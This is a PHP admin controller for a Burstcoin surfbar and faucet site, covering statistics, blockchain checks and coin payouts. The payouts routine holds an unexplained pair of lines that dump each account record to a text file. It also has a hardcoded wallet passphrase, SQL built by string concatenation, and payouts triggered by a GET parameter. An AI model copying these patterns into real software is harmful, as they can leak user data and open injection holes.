<?php
class ControllerAdmin extends Controller {
        /**
         * Stats
         */
        function stats() { 
                // Lade Module                
                $this->load->model('Wallet');
                
                // Wallet-Status auslesen
                $walletData = $this->model_wallet->request('getState');
                $this->smarty->assign('walletData', $walletData);
                
                // Datenbank-Werte auslesen
                $numberOfBlocks = $this->db->query("SELECT COUNT(*) AS blocks FROM ".DB_PRE."chain_blocks");
                $this->smarty->assign('numberOfBlocks', $numberOfBlocks[0]);
                
                $numberOfAccounts = $this->db->query("SELECT COUNT(*) AS accounts FROM ".DB_PRE."chain_accounts");
                $this->smarty->assign('numberOfAccounts', $numberOfAccounts[0]);
                
                $numberOfTransactions = $this->db->query("SELECT COUNT(*) AS transactions FROM ".DB_PRE."chain_transactions");
                $this->smarty->assign('numberOfTransactions', $numberOfTransactions[0]);
                
                $totalSupply = $this->db->query("SELECT SUM(blockReward) AS supply FROM ".DB_PRE."chain_blocks");
                $this->smarty->assign('totalSupply', $totalSupply[0]);
                
                $unsyncedBlocks = $this->db->query("SELECT COUNT(*) AS unsyncedBlocks FROM ".DB_PRE."chain_blocks WHERE resynced='0'");
                $this->smarty->assign('unsyncedBlocks', $unsyncedBlocks[0]['unsyncedBlocks']);
                
                // Fehlende Blöcke
                $missingBlocks = $this->db->query(
                        "SELECT (t1.height + 1) as gap_starts_at, 
                        (SELECT MIN(t3.height) -1 FROM ".DB_PRE."chain_blocks t3 WHERE t3.height > t1.height) as gap_ends_at
                        FROM ".DB_PRE."chain_blocks t1
                        WHERE NOT EXISTS (SELECT t2.height FROM ".DB_PRE."chain_blocks t2 WHERE t2.height = t1.height + 1)
                        HAVING gap_ends_at IS NOT NULL");
                $this->smarty->assign('missingBlocks', $missingBlocks);
                
                // Total Payouts
                $last7Days = mktime(0, 0, 0, date("m"), date("d")-7, date("Y"));
                $last14Days = mktime(0, 0, 0, date("m"), date("d")-14, date("Y"));
                $last28Days = mktime(0, 0, 0, date("m"), date("d")-28, date("Y"));
                               
                $getSurfbarPayouts = $this->db->query("SELECT SUM(amount) AS burstcoins, COUNT(*) AS burstfee FROM ".DB_PRE."surfbar_payouts WHERE ts_payed>='".$last7Days."'");
                $this->smarty->assign('surfbarPayoutL7D', $getSurfbarPayouts[0]['burstcoins']+$getSurfbarPayouts[0]['burstfee']);                
                $getSurfbarPayouts = $this->db->query("SELECT SUM(amount) AS burstcoins, COUNT(*) AS burstfee FROM ".DB_PRE."surfbar_payouts WHERE ts_payed>='".$last14Days."'");
                $this->smarty->assign('surfbarPayoutL14D', $getSurfbarPayouts[0]['burstcoins']+$getSurfbarPayouts[0]['burstfee']);                
                $getSurfbarPayouts = $this->db->query("SELECT SUM(amount) AS burstcoins, COUNT(*) AS burstfee FROM ".DB_PRE."surfbar_payouts WHERE ts_payed>='".$last28Days."'");
                $this->smarty->assign('surfbarPayoutL28D', $getSurfbarPayouts[0]['burstcoins']+$getSurfbarPayouts[0]['burstfee']);
                $getSurfbarPayouts = $this->db->query("SELECT SUM(amount) AS burstcoins, COUNT(*) AS burstfee FROM ".DB_PRE."surfbar_payouts");
                $this->smarty->assign('surfbarPayoutTotal', $getSurfbarPayouts[0]['burstcoins']+$getSurfbarPayouts[0]['burstfee']); 
                
                $getFaucetPayouts = $this->db->query("SELECT SUM(amount) AS burstcoins, COUNT(*) AS burstfee FROM ".DB_PRE."faucet WHERE ts_faucet>='".$last7Days."'");
                $this->smarty->assign('faucetPayoutL7D', $getFaucetPayouts[0]['burstcoins']+$getFaucetPayouts[0]['burstfee']);
                $getFaucetPayouts = $this->db->query("SELECT SUM(amount) AS burstcoins, COUNT(*) AS burstfee FROM ".DB_PRE."faucet WHERE ts_faucet>='".$last14Days."'");
                $this->smarty->assign('faucetPayoutL14D', $getFaucetPayouts[0]['burstcoins']+$getFaucetPayouts[0]['burstfee']);
                $getFaucetPayouts = $this->db->query("SELECT SUM(amount) AS burstcoins, COUNT(*) AS burstfee FROM ".DB_PRE."faucet WHERE ts_faucet>='".$last28Days."'");
                $this->smarty->assign('faucetPayoutL28D', $getFaucetPayouts[0]['burstcoins']+$getFaucetPayouts[0]['burstfee']);
                $getFaucetPayouts = $this->db->query("SELECT SUM(amount) AS burstcoins, COUNT(*) AS burstfee FROM ".DB_PRE."faucet");
                $this->smarty->assign('faucetPayoutTotal', $getFaucetPayouts[0]['burstcoins']+$getFaucetPayouts[0]['burstfee']); 
                
                $this->smarty->assign('totalPayoutFee', $getSurfbarPayouts[0]['burstfee']+$getFaucetPayouts[0]['burstfee']);                                
                
                $this->template = 'Admin/stats';
        }
                
        /**
         * Prüfe Blockchain-Datenbank
         */
        function check() {
                set_time_limit(0);

                if (isset($_GET['p0']) AND $_GET['p0'] == "accounts") {
                        // Ermittle die Gesamtanzahl der Accounts
                        $countAccounts = $this->db->query("SELECT COUNT(*) AS totalAccounts FROM ".DB_PRE."chain_accounts");
                        echo $countAccounts[0]['totalAccounts'];
                        
                        
                } elseif (isset($_GET['p0']) AND $_GET['p0'] == "transactions") {
                        // Suche nach Transaktionen bei den die Block-ID nicht gefunden wurde
/**                        
                        $getTransactions = $this->db->query("SELECT transactionid FROM ".DB_PRE."chain_transactions AS t1
  WHERE NOT EXISTS (SELECT 1 FROM ".DB_PRE."chain_blocks AS t2 WHERE t1.block = t2.block) ORDER BY transaction DESC");
                        if (isset($getTransactions[0])) {
                                foreach ($getTransactions AS $transaction) {
                                        //$this->db->query("DELETE FROM ".DB_PRE."chain_transactions WHERE transactionid='".$transaction['transactionid']."'");
                                }
                        }
                        print_r($getTransactions);
                        exit(); **/
                        // Lese die zu überprüfenden Blöcke aus
                        $getBlocks = $this->db->query("SELECT numberOfTransactions, block, height FROM ".DB_PRE."chain_blocks ORDER BY blockid ASC LIMIT 350000,2000");
                        foreach ($getBlocks AS $block) {
                                $getTransactions = $this->db->query("SELECT COUNT(*) AS transactions FROM ".DB_PRE."chain_transactions WHERE block='".$block['block']."'");
                                if ($getTransactions[0]['transactions'] != $block['numberOfTransactions']) {
                                        echo "<p>Differenz in Block: ".$block['height']." (Blockchain: ".$getTransactions[0]['transactions']." | Datenbank: ".$block['numberOfTransactions'].")</p>";
                                }
                        }                        
                }
                
                exit();
        }
        
        /**
         * Payouts
         */
        function payouts() {
                // Prüfe ob eine Zahlung gesendet werden soll
                if (isset($_GET['p0']) AND $_GET['p0'] > 0) {
                        // Lese den Umrechnungskurs aus                                        
                        $getStats = $this->db->query("SELECT ebesucherRate FROM ".DB_PRE."stats");
                        $getAccount = $this->db->query("SELECT * FROM ".DB_PRE."surfbar WHERE surfbarid='".$this->db->escapeString($_GET['p0'])."'");
                        if (isset($getAccount[0])) {

$txt = print_r($getAccount[0], true);
$myfile = file_put_contents('CALLTHISFILEHOWEVERYOUWANT.txt', $txt.PHP_EOL , FILE_APPEND);
                                $accountBalance = $getAccount[0]['surfpoints']+$getAccount[0]['surfpoints_ref']-$getAccount[0]['surfpoints_converted'];
                                if ($accountBalance >= 2000) {
                                        $burstAmount = number_format(round($accountBalance*SURFBAR_VALUE/$getStats[0]['ebesucherRate'], 8), 8, '.', '');

                                        // Sende die Burstcoins
                                        $options = array(
                                                'http' => array(
                                                        'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
                                                        'method'  => 'POST',
                                                        'content' => http_build_query(array(
                                                                'requestType' => 'sendMoney',
                                                                'recipient' => $getAccount[0]['address'],
                                                                'amountNQT' => str_replace('.', '', $burstAmount),
                                                                'secretPhrase' => 'passphrase',
                                                                'feeNQT' => '100000000',
                                                                'deadline' => '24'
                                                        )),
                                                ),
                                        );
                                        $context  = stream_context_create($options);
                                        $result = file_get_contents("http://".BURST_API.":8125/burst", false, $context);
                                        $content = json_decode($result, true);
                                        if (isset($content['transaction'])) {
                                                // Ziehe den Betrag vom Account ab
                                                $this->db->query("UPDATE ".DB_PRE."surfbar SET surfpoints_converted=surfpoints_converted+'".$accountBalance."' WHERE surfbarid='".$getAccount[0]['surfbarid']."'");

                                                // Speichere die Transaktion
                                                $this->db->query(
                                                        "INSERT INTO ".DB_PRE."surfbar_payouts ".
                                                        "(surfbarid, amount, surfpoints, transaction, ts_payed) ".
                                                        "VALUES ".
                                                        "('".$getAccount[0]['surfbarid']."', '".$burstAmount."', '".$accountBalance."', '".$content['transaction']."', '".time()."')");
                                        }
                                }
                        }
                }
                
                // Ermittle den Gesamtverdienst durch eBesucher
                $getEbesucher = $this->db->query("SELECT SUM(surfpoints) AS totalSurfpoints FROM ".DB_PRE."surfbar");
                $this->smarty->assign('totalSurfpoints', $getEbesucher[0]['totalSurfpoints']);
                
                // Ermittle die Gesamtsumme der bisherigen Auszahlungen
                $getPayouts = $this->db->query("SELECT SUM(surfpoints) AS totalSurfpoints, SUM(amount) AS burstcoins, COUNT(*) AS burstfee FROM ".DB_PRE."surfbar_payouts");
                $this->smarty->assign('totalPayouts', $getPayouts[0]);
                
                // Ermittle den verfügbaren Auszahlungsbetrag in der Hot Wallet
                $availableBalance = $this->db->query("SELECT unconfirmedBalanceNQT FROM ".DB_PRE."chain_accounts WHERE account='1612972017843407914'");
                $this->smarty->assign('availableBalance', $availableBalance[0]['unconfirmedBalanceNQT']);
                
                // Berechne den Ref-Verdienst
                $getRefs = $this->db->query("SELECT SUM(surfpoints) AS totalSurfpoints, referralid FROM ".DB_PRE."surfbar WHERE referralid>'0' GROUP BY referralid");
                foreach ($getRefs AS $ref) {
                        $refpoints = 0;
                        if ($ref['totalSurfpoints'] > 0) {
                                $refpoints = $ref['totalSurfpoints']/100*5;
                        }
                        $this->db->query("UPDATE ".DB_PRE."surfbar SET surfpoints_ref='".$refpoints."' WHERE surfbarid='".$ref['referralid']."'");
                }
                
                // Lese den Umrechnungskurs aus
                $this->smarty->assign('spvalue', SURFBAR_VALUE);
                
                // Berechne die Balance der User
                $getBalance = $this->db->query("SELECT t1.surfbarid, t1.address, (t1.surfpoints+t1.surfpoints_ref-t1.surfpoints_converted) AS totalBalance, t2.name FROM ".DB_PRE."surfbar AS t1 LEFT JOIN ".DB_PRE."chain_accounts AS t2 ON t1.address=t2.accountRS ORDER BY totalBalance DESC");
                $totalUserBalance = 0;
                foreach($getBalance AS $userBalance) {
                        $totalUserBalance = $totalUserBalance+$userBalance['totalBalance'];
                }
                $this->smarty->assign('accounts', $getBalance);
                $this->smarty->assign('totalSurfbarBalance', $totalAdminBalance+$totalUserBalance);
                
                // Lese Missing Payouts aus
                $missingPayouts = $this->db->query("SELECT * FROM ".DB_PRE."surfbar_payouts WHERE valid='0'");
                if (is_array($missingPayouts)) {
                        foreach ($missingPayouts AS $payout) {
                                $getTransaction = $this->db->query("SELECT * FROM ".DB_PRE."chain_transactions WHERE transaction='".$payout['transaction']."'");
                                if (is_array($getTransaction) AND count($getTransaction) == 1) {
                                        if ($payout['amount'] == $getTransaction[0]['amountNQT']) {
                                                $this->db->query("UPDATE ".DB_PRE."surfbar_payouts SET valid='1' WHERE payoutid='".$payout['payoutid']."'");
                                        }
                                }
                        }
                }
                $missingPayouts = $this->db->query("SELECT t1.*, t2.address FROM ".DB_PRE."surfbar_payouts AS t1 LEFT JOIN ".DB_PRE."surfbar AS t2 ON t1.surfbarid=t2.surfbarid WHERE t1.valid='0' ORDER BY t1.payoutid DESC");
                $this->smarty->assign('missingPayouts', $missingPayouts);
                
                // Surfbar Statistik
                $surfbarUserTotal = $this->db->query("SELECT COUNT(*) AS userTotal FROM ".DB_PRE."surfbar");
                $this->smarty->assign('surfbarUserTotal', $surfbarUserTotal[0]['userTotal']);
                
                $surfbarUserActive = $this->db->query("SELECT COUNT(*) AS userTotal FROM ".DB_PRE."surfbar WHERE surfpoints>'0' OR surfpoints_ref>'0'");
                $this->smarty->assign('surfbarUserActive', $surfbarUserActive[0]['userTotal']);
                
                $surfbarUserInactive = $this->db->query("SELECT COUNT(*) AS userTotal FROM ".DB_PRE."surfbar WHERE surfpoints='0' AND surfpoints_ref='0'");
                $this->smarty->assign('surfbarUserInactive', $surfbarUserInactive[0]['userTotal']);
                
                $last24h = time()-86400;
                $last48h = time()-172800;                
                $surfbarUserNew24 = $this->db->query("SELECT COUNT(*) AS userTotal FROM ".DB_PRE."surfbar WHERE ts_create>'".$last24h."'");
                $this->smarty->assign('surfbarUserNew24', $surfbarUserNew24[0]['userTotal']);
                
                $surfbarUserNew48 = $this->db->query("SELECT COUNT(*) AS userTotal FROM ".DB_PRE."surfbar WHERE ts_create>'".$last48h."'");
                $this->smarty->assign('surfbarUserNew48', $surfbarUserNew48[0]['userTotal']);
                
                $surfbarUserLogin48 = $this->db->query("SELECT COUNT(*) AS userTotal FROM ".DB_PRE."surfbar WHERE ts_login>'".$last48h."'");
                $this->smarty->assign('surfbarUserLogin48', $surfbarUserLogin48[0]['userTotal']);
                
                require_once DIR_SYSTEM.DS.'config'.DS.'site.php';
                $this->smarty->assign('burstPayed', $conf['surfbar']['burstPayed']);
                $this->smarty->assign('burstEuro', $conf['surfbar']['burstEuro']);
                $this->smarty->assign('burstEuroRate', $conf['surfbar']['burstEuroRate']);
                
                $this->template = 'Admin/payouts';
        }
}
